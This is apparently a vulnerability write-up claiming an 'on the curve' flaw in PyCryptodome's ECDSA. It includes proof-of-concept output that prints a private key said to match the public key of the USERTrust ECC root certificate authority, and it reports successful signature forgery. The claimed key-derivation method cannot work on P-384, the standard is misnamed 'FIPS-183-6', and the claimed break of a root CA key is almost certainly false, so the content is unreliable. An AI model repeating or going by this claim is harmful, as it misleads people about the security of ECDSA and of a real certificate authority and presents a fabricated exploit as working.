# ECC On The Curve Vulnerability

## Exploiting ECDSA Signatures

### Issue:

ECDSA signatures will improperly validate spoofed keys with forced public keys. In this proof-of-concept ECDSA keys are generated with ```length = len(x+y) ``` and ```d = random(length)-(x+y)``` to exploit PyCryptodomes ECDSA implementations.

- https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Signature/DSS.py
- https://www.rfc-editor.org/rfc/rfc6979
- https://csrc.nist.gov/csrc/media/publications/fips/186/3/archive/2009-06-25/documents/fips_186-3.pdf

### Proof of Concept:

```
 python .\ECCTool.py
X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
D: 27362011191244522599400977620412273256865510408751044570755755486992953037333842464164901064989290490254223630055135
------------------------------------------------------------------------------
Spoofed X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
X matches
Spoofed Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
Y matches
------------------------------------------------------------------------------
Exporting Key
-----BEGIN PRIVATE KEY-----
MIG2AgEAMBAGByqGSM49AgEGBSuBBAAiBIGeMIGbAgEBBDCxxkp6uxcwPfu7QYSd
qjki7PEfmzP/jlBgZHLuOWGbzzVwLQN1OHwZzGNJpOiCtt+hZANiAAQarFRaqflo
I+d61SRvU8Za2EurxtW20eZzca7dnNYMYf3boIkDuAUU7FfO7l0/4iGzzvfUinng
o4N+LZfQYcTxmdwlkWOrfzCjtHDix6EznPO/LlxTsV+zfTJ/ijTjeXk=
-----END PRIVATE KEY-----
------------------------------------------------------------------------------
Testing deterministic-rfc6979 signature
Signature: b'06MvLMpqCepsI43/rUKaQDatG1q7ch+6jT1cpairfqIJNyNtHgCniD01Z6DWCZyjl5o4XX8YIQLZ1gJvz54FRQpt0SuJ2jGuJRzwy80tpJz1UjEpIEAB8q61tFM9WMF0'
deterministic-rfc6979 signature generated
deterministic-rfc6979 signature is validated!
Successful exploitation of on the curve vulnerability!
------------------------------------------------------------------------------
Testing FIPS-183-6 signature
Signature generated
Signature: b'yKQZ+itxNbdgbYMHZ9B0dHYxLtX00qNrmy0xGcwi1ODbEmk344wiQAFGq5mDy3hlD9UyWyy8vb1rQrjPvZKBgMbisnmYSHtZRr0fnGLJW11hFIcd1Cd73D26YWjLOdlo'
FIPS-183-6 signature is validated!
Successful exploitation of on the curve vulnerability!
------------------------------------------------------------------------------
Results for 'On the Curve Vulnerability':
RFC 6979: True
FIPS-183-6: True
```
#### Matching Public Keys via OpenSSL:

``` 
x509 -in ECC.pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5c:8b:99:c5:5a:94:c5:d2:71:56:de:cd:89:80:cc:26
    Signature Algorithm: ecdsa-with-SHA384
        Issuer: C=US, ST=New Jersey, L=Jersey City, O=The USERTRUST Network, CN=USERTrust ECC Certification Authority
        Validity
            Not Before: Feb  1 00:00:00 2010 GMT
            Not After : Jan 18 23:59:59 2038 GMT
        Subject: C=US, ST=New Jersey, L=Jersey City, O=The USERTRUST Network, CN=USERTrust ECC Certification Authority
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (384 bit)
                pub:
                    04:1a:ac:54:5a:a9:f9:68:23:e7:7a:d5:24:6f:53:
                    c6:5a:d8:4b:ab:c6:d5:b6:d1:e6:73:71:ae:dd:9c:
                    d6:0c:61:fd:db:a0:89:03:b8:05:14:ec:57:ce:ee:
                    5d:3f:e2:21:b3:ce:f7:d4:8a:79:e0:a3:83:7e:2d:
                    97:d0:61:c4:f1:99:dc:25:91:63:ab:7f:30:a3:b4:
                    70:e2:c7:a1:33:9c:f3:bf:2e:5c:53:b1:5f:b3:7d:
                    32:7f:8a:34:e3:79:79
                ASN1 OID: secp384r1
                NIST CURVE: P-384
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                3A:E1:09:86:D4:CF:19:C2:96:76:74:49:76:DC:E0:35:C6:63:63:9A
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: ecdsa-with-SHA384
         30:65:02:30:36:67:a1:16:08:dc:e4:97:00:41:1d:4e:be:e1:
         63:01:cf:3b:aa:42:11:64:a0:9d:94:39:02:11:79:5c:7b:1d:
         fa:64:b9:ee:16:42:b3:bf:8a:c2:09:c4:ec:e4:b1:4d:02:31:
         00:e9:2a:61:47:8c:52:4a:4b:4e:18:70:f6:d6:44:d6:6e:f5:
         83:ba:6d:58:bd:24:d9:56:48:ea:ef:c4:a2:46:81:88:6a:3a:
         46:d1:a9:9b:4d:c9:61:da:d1:5d:57:6a:18
         ```
```
 pkey -in key.pem -noout -text
Private-Key: (384 bit)
priv:
    00:b1:c6:4a:7a:bb:17:30:3d:fb:bb:41:84:9d:aa:
    39:22:ec:f1:1f:9b:33:ff:8e:50:60:64:72:ee:39:
    61:9b:cf:35:70:2d:03:75:38:7c:19:cc:63:49:a4:
    e8:82:b6:df
pub:
    04:1a:ac:54:5a:a9:f9:68:23:e7:7a:d5:24:6f:53:
    c6:5a:d8:4b:ab:c6:d5:b6:d1:e6:73:71:ae:dd:9c:
    d6:0c:61:fd:db:a0:89:03:b8:05:14:ec:57:ce:ee:
    5d:3f:e2:21:b3:ce:f7:d4:8a:79:e0:a3:83:7e:2d:
    97:d0:61:c4:f1:99:dc:25:91:63:ab:7f:30:a3:b4:
    70:e2:c7:a1:33:9c:f3:bf:2e:5c:53:b1:5f:b3:7d:
    32:7f:8a:34:e3:79:79
ASN1 OID: secp384r1
NIST CURVE: P-384
```

### Recommendation:

Stop using ECDSA keys.
